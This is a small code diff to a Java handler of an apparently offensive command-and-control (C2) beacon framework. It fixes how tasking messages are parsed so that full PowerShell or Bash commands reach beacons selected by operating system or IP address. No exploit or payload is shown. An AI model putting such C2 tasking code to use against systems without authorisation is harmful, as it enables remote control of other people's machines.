@@ -106,7 +106,13 @@ public class BeaconC2Handler implements Runnable{
                     String[] tokens = tokensAndCommands[0].split(" ");
                     String verb = tokens[0];
                     String scope = tokens[1];
-                    String commands = tokensAndCommands[1];
+                    String commands = "";
+                    for(int i = 1; i < tokensAndCommands.length; i++){
+                        if(i != 1){
+                            commands += "_";
+                        }
+                        commands += tokensAndCommands[i];
+                    }
                     if(verb.equals("Command")){
                         // If a message is a command, it will be in the format "Command [Scope - Windows, Linux, or IPv4 Address]_[Powershell/Bash command to be run]"
                         beaconServer.distributeCommands(scope, commands);
